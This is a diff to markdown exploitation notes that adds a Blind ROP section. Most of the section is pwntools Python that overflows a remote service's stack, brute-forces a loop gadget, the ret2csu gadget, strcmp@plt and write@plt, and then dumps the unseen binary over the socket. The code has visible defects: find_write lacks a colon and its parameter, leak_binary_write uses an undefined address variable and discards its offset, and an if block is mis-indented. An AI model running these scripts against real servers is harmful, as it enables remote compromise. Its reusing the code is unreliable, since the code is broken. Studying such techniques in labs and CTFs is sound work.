@@ -309,7 +309,8 @@ For de-randomizing libc, we can use &GOT_TABLE, coupled with some read(), write(
         <div>
 
 Steps of Exploitation:
-		
+
+Puts/Printf() when fd is 0,1,2 stdin,stdout,stderror
 1. find a loop-gadget
 2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
 3. find puts@plt
@@ -319,7 +320,8 @@ Steps of Exploitation:
 ### find loop-gadget
 the example binary prints `Are you blind my friend?\n` and than asks us for input
 so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again
-		
+
+
 ```
 def find_loop_gadget(i):
     
@@ -627,6 +629,372 @@ def pwn():
 
 </div>
 </details>
+
+
+<details>
+    <summary>BROP (dont have the binary // PIE off // puts() not in binary)</summary>
+        <div>
+
+1. find a loop-gadget
+2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
+3. find strcmp@PLT (strcmp sets rdx)
+4. find write@PLT (let us write to any fd)
+5. leak the binary
+
+### find loop-gadget
+the example binary prints `Are you blind my friend?\n` and than asks us for input
+so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again
+
+
+```
+def find_loop_gadget(i):
+    
+    r = remote(ip, port,timeout=1)
+    
+    addr_guess = i + 0x400200                         #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
+        
+    payload = b'A'*88                                 #pad
+    payload += p64(addr_guess)                        #rip
+
+    r.readuntil(b'Are you blind my friend?\n')        #read the first (intendet) "Are you blind my friend?\n" 
+    r.send(payload)
+
+
+    try:
+        check = r.recvline()                          #trys to read a line if cant read a line EOF error will be thrown
+        if b'Are you blind my friend?\n' in check:    #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr
+            return int(addr_guess)              
+        else:
+            print(check)                              #if we recv something that is not 'Are you blind my friend?\n' we print to check what it was
+            print(r.recvline())                       #than try to read more that should throw an EOF error if not inspect further
+            r.close()
+    except:
+        print(sys.exc_info()[0])                      #prints the error
+        print(i)                                      #prints the iterator
+        r.close()
+
+
+for i in range(0x2000):                               #loop  0x400200 -> 0x402200   
+    loop = find_loop_gadget(i)                  
+    if loop:                            
+        print(f'found loop_gadget @ {hex(loop)}')
+        break                                         #remove this break if you want to find more potential loop addr.
+```
+
+
+
+### find brop-gadget
+
+ok we now have a loop-gadget now we need to find a brop-gadget (popper gadget from ret2csu)
+6 pops in a row are pretty uncommon so its not hard to indentify it.
+
+
+```
+def find_brop_gadget(i):
+
+
+    r = remote(ip, port,timeout=1)
+
+    addr_guess = i + 0x400200                          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
+
+    payload = b'A'*88                                  #pad
+    payload += p64(addr_guess)                         #rip 
+    payload += p64(0x00)                               #setup stack
+    payload += p64(0x00)
+    payload += p64(0x00)
+    payload += p64(0x00)
+    payload += p64(0x00)
+    payload += p64(0x00)
+    payload += p64(loop)                               #loop back to main
+
+    r.recvuntil(b'Are you blind my friend?\n')         #read the first (intendet) "Are you blind my friend?\n" 
+    r.send(payload)
+
+    try:
+        check = r.recvline()                           #trys to read a line if cant read a line EOF error will be thrown
+        if b'Are you blind my friend?\n' in check:     #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr since our 6 pops goes throu
+                                                       #2nd check if we are on the right gadget this time we want a crash
+                p = remote(ip,port,timeout=1)
+
+                payload = b'A'*88                      #pad
+                payload += p64(addr_guess)             #rip
+                payload += p64(0x00)                   #setup stack
+                payload += p64(0x00)    
+                payload += p64(0x00)
+                payload += p64(0x00)
+                payload += p64(0x00)
+                payload += p64(0x00)
+                payload += p64(0x00)                   # one extra 0x00 to crash. ret to 0x00 is allways a crash  
+                payload += p64(loop)                   # if it still prints 'Are you blind my friend?\n' its the wrong guess addr
+        
+                p.recvuntil(b'Are you blind my friend?\n')     #read the first (intendet) "Are you blind my friend?\n" 
+                p.send(payload)                 
+                
+                try:
+                    check2 = p.recvline()              #try to read a line if we can read a line we are on the wrong addr guess #we should crash here
+                    if check2:                         #if we can recv something addr guess are wrong
+                    print('not passed check2')
+                    p.close()
+                    r.close()
+
+                except:                                #we want a crash so if we crash were good
+                    r.close()
+                    p.close()
+                    return addr_guess
+
+        else:                                          #if we can recv something on the initial check but its not "Are you blind my friend?\n" or we hang
+                r.close()                              #close connection
+    except:                                            #if we crash during first payload wrong guess addr
+        print(sys.exc_info()[0])
+        r.close()
+
+
+for i in range(0x2000):                                #loop  0x400200 -> 0x402200 
+    brop = find_brop_gadget(i)
+    if brop:
+        print(f'found brop_gadget @ {hex(brop)}')
+        break                                          #remove this break if you want to find more potential brop-gadget addr.
+    
+
+pop_rdi = int(brop) + 0x9                              #we need this later 
+pop_rsi_r15 = int(brop) + 0x7                          #we need this later
+
+```
+
+```
+def find_strcmp(i):
+    
+    r = remote(ip, port,timeout=1)
+                                                #iterate in steps of 0x10 same as finding puts
+    addr_guess = i*0x10 + 0x400200                    #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
+
+    payload = b'A'*88                           #pad
+    payload += p64(pop_rdi)                     #pop 1st argument for # int strcmp (const char* str1, const char* str2); strcmp(rdi,rsi)
+    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
+    payload += p64(pop_rsi_r15)                 #pop 2nd argument   
+    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
+    payload += p64(0x00)                        #junk to fill r15
+    payload += p64(addr_guess)                  #the addr guess for strcmp@plt
+    payload += p64(loop)                        #loop back to main if check for GOOD:GOOD pointers work 
+    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
+    r.send(payload)
+    
+
+    try:
+        check = r.recvline()                                            #trys to recv if cant recv anything EOF error
+        if b'Are you blind my friend?\n' in check:                      #if we can find 'Are you blind my friend?\n' we passed check1 
+            r.close()
+            print('\n1st check passed good:good')
+            
+            print(f'2nd check for {hex(addr_guess)} good:bad')
+            p = remote(ip,port,timeout=1)
+
+            payload = b'A'*88                                           #same as above but with GOOD:BAD pointers that should crash
+            payload += p64(pop_rdi) 
+            payload += p64(0x400000)                                    #holds valide pointer to 'ELF'          GOOD
+            payload += p64(pop_rsi_r15)
+            payload += p64(0x0)                                         #holds invalide pointer to 0x00         BAD
+            payload += p64(0x0)
+            payload += p64(addr_guess)
+            payload += p64(loop)        
+            p.readuntil('Are you blind my friend?\n')
+            p.send(payload)
+                
+            try:
+                check2 = p.recvline()
+
+                if check2: 
+                    print('not passed check2')
+                    p.close()
+                else:
+                    print('not passed check2')
+                    p.close()
+
+            except:
+                r.close()
+                p.close()
+                print(f'3nd check for {hex(addr_guess)} bad:good')
+                p = remote(ip,port,timeout=1)
+
+                payload = b'A'*88                                       #same as above but with BAD:GOOD pointers that should crash    
+                payload += p64(pop_rdi)
+                payload += p64(0x0)                                     #holds invalide pointer to 0x00         BAD
+                payload += p64(pop_rsi_r15)
+                payload += p64(0x400000)                                #holds valide pointer to 'ELF'          GOOD
+                payload += p64(0x0)
+                payload += p64(addr_guess)
+                payload += p64(loop)         
+                p.readuntil('Are you blind my friend?\n')
+                p.send(payload)
+
+                try:
+                    check3 = p.recvline()
+
+                    if check3: 
+                        print('not passed check3')
+                        p.close()
+                    else:
+                        print('not passed check3')
+                        p.close()
+
+                except:
+                    p.close()
+                    print(f'4rd check for {hex(addr_guess)} bad:bad')
+                    p = remote(ip,port,timeout=1)
+
+                    payload = b'A'*88                                   #same as above but with BAD:BAD pointers that should crash
+                    payload += p64(pop_rdi) 
+                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
+                    payload += p64(pop_rsi_r15)
+                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
+                    payload += p64(0x0)             
+                    payload += p64(addr_guess)
+                    payload += p64(loop)         
+                    p.readuntil('Are you blind my friend?\n')
+                    p.send(payload)
+                    try:
+                        check4 = p.recvline()
+
+                        if check4: 
+                            print('not passed check4')
+                            p.close()
+
+                        else:
+                            print('not passed check4')
+                            p.close()
+
+
+                    except:
+                        p.close()
+                        print(sys.exc_info()[0])
+                        return addr_guess                               #if all checks were good we return the guess_addr
+
+        else:
+            r.close()
+    except:
+        print(sys.exc_info()[0])
+        print(hex(addr_guess))
+        r.close()
+
+
+for i in range(0x50):                                                   # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
+        strcmp = find_strcmp(i)
+        if strcmp:
+            print(f'found strcmp @ {hex(strcmp)}')
+            break                                                       #remove this break if you want to find more potential strcmp@plt addr.
+
+ ```
+
+ ```
+def find_write()                                #ssize_t write(int fd, const void *buf, size_t count); write(rdi,rsi,rdx)
+
+    r = remote(ip, port,timeout=1)  
+
+
+    pop_rdi = int(brop) + 0x9                    
+    pop_rsi_r15 = int(brop) + 0x7
+
+
+                                                #iterate in steps of 0x10
+    addr_guess = i*0x10 + 0x400200              #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers 
+
+    payload = b'A'*88                           #pad
+    payload += p64(pop_rdi)                     #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
+    payload += p64(0x400000)                    #rdi points to 0x400000 which should hold 'ELF'
+    payload += p64(pop_rsi_r15)
+    payload += p64(0x400000)                    #rsi points to 0x400000 which should hold 'ELF'
+    payload += p64(0x00)                        #junk r15
+    payload += p64(strcmp)                      #sets rdx to != 0x00
+    payload += p64(pop_rdi)
+    payload += p64(0x01)                        #fd for write usually 0x01 but when we connect throu a socket maybe differ
+    payload += p64(addr_guess)
+                                                
+
+
+    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
+    r.send(payload)
+    
+
+
+    try:
+        check = r.recvline()                    #trys to recv if cant recv anything EOF error
+        if b'ELF' in check:                     #if the str 'ELF' is in the check we found a potential write@plt addr.
+            r.close()
+            return addr_guess
+        else:
+            print(check)                        #debugging if something weard was printed
+    except:
+        print(sys.exc_info()[0])                #printes the error
+        print(i)                                #prints the iterator
+        r.close()
+
+for i in range(0x50):                           # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
+    write = find_write(i)
+    if write:
+        print(f'found write @ {hex(write)}')
+        break                                   #remove this break if you want to find more potential write@plt addr.
+ ```
+
+ 
+### leak the process with write()
+```
+def leak_binary_write(i,j):
+
+    pop_rdi = int(brop) + 0x9                    
+    pop_rsi_r15 = int(brop) + 0x7
+
+    r = remote(ip, port,timeout=1)
+    
+    x = i + j
+
+    payload = b'A'*88                                   #pad
+    payload += p64(pop_rdi)                             #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
+    payload += p64(0x400000)                            #rdi points to 0x400000 which should hold 'ELF'
+    payload += p64(pop_rsi_r15)
+    payload += p64(0x400000)                            #rsi points to 0x400000 which should hold 'ELF'
+    payload += p64(0x00)                                #junk r15
+    payload += p64(strcmp)                              #sets rdx to 0x07
+
+    payload += p64(pop_rdi)
+    payload += p64(0x01)                                #fd for write usually 0x01 but when we connect throu a socket maybe differ
+    payload += p64(pop_rsi_r15)
+    payload += p64(x)                                   #addr to leak
+    payload += p64(0x00)                                #junk r15   
+    payload += p64(addr_guess)                          #ssize_t write(int fd, const void *buf, size_t count); write(rdi,rsi,rdx)
+
+    r.recvline()                                        #read the first (intendet) "Are you blind my friend?\n"
+    r.send(payload)
+
+
+
+    try:
+        check = r.recvline()                            #trys to recv the leak if nothin is recv inc offset by 1 and continue
+        if check:
+            file.append(check[:-1])
+            r.close() 
+            
+        else:
+            r.close()
+    except:                                             #inc offset by 1 and continue
+        print(sys.exc_info()[0])
+        r.close()
+
+
+file = []
+offset = 7                                              #0x400000 = 0x00010102464c457f so 7
+
+for i in range(0xb00):                      
+    offset = leak_binary_write(i*offset,0x400000)
+    print(f'{hex(i*offset)}')
+
+
+string1 = b''.join(file)
+
+with open('binary_dump', 'wb') as out:
+    out.write(string1)
+    out.close()
+
+```
 
 
 
